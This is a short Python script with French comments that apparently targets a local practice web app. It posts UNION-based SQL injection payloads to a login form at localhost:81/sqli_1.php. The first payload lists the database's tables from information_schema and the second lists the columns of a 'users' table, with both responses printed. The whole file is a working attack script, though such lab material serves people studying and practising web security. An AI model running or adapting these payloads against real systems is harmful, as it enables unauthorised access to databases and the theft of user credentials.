import requests

url = "http://localhost:81/sqli_1.php"  # URL cible

# Payload pour récupérer les tables de la base de données
payload_tables = {
    "login": "admin' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE() -- -",
    "password": "password",
    "form": "submit"
}

session = requests.Session()
response = session.post(url, data=payload_tables)
print("Tables trouvées:")
print(response.text)

# Payload pour récupérer les colonnes d'une table spécifique (remplacez 'users' par la table cible)
table_target = "users"
payload_columns = {
    "login": f"admin' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table_target}' -- -",
    "password": "password",
    "form": "submit"
}

response = session.post(url, data=payload_columns)
print(f"Colonnes de la table {table_target}:")
print(response.text)